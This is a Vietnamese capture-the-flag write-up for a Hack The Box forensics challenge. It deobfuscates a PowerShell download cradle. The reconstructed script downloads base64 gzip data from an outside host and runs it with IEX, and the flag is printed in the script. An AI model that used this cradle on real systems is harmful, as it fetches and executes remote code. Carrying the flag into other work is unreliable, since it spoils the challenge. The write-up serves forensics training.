> [!NOTE]
> - Mức độ: Rất dễ 
> - Loại: Forensics
> - Url: [Alien Cradle](https://app.hackthebox.com/challenges/Alien%2520Cradle)
> - Mô tả: Trong nỗ lực tìm kiếm thêm thông tin về di vật, các thực thể ngoài hành tinh đã thực hiện một cuộc tấn công nhắm vào những người bạn thân thiết và đối tác của Pandora — những người có khả năng nắm giữ các bí mật liên quan đến di vật này. Trong một sự kiện gần đây được cho là do chúng dàn dựng, Pandora đã phát hiện một đoạn mã PowerShell kỳ lạ từ các nhật ký sự kiện (event logs), hay còn được gọi là "PowerShell cradle". Những đoạn mã kiểu này thường được dùng để tải xuống và thực thi các giai đoạn tiếp theo của cuộc tấn công. Tuy nhiên, đoạn mã này đã bị làm rối (obfuscated) khiến Pandora không thể hiểu được nội dung của nó. Bạn có thể giúp cô ấy giải mã (deobfuscate) đoạn mã này không?

> - Giải nén thu được 1 file cradle.ps1 chứa mã PowerShell 
> - Đoạn mã này được làm rối (obfuscated) nhẹ và viết trên 1 dòng khiến khó đọc nên tái xấu trúc lại mã 
> - Đoạn mã kiểm tra xem tài khoản người dùng hiện tại có phải `Arth` và máy có phải `secret_HQ` nếu không chính xác sẽ thoát 
> - Tải dữ liệu mã hóa base64 từ `http://windowsliveupdater.com/updates/3396f3bf5a605cc41bd0d6e2291482a5/2_34122.gzip.b64` về , giải mã gzip dữ liệu đã giải mã 
> - Trong file cũng có flag 

```powershell
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth') {
    exit
}

$w = New-Object net.webclient
$w.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials

$d = $w.DownloadString('http://windowsliveupdater.com/updates/3396f3bf5a605cc41bd0d6e2291482a5/2_34122.gzip.b64')

$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d))

$f = 'HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}'

IEX (
    New-Object IO.StreamReader(
        New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress)
    )
).ReadToEnd()
```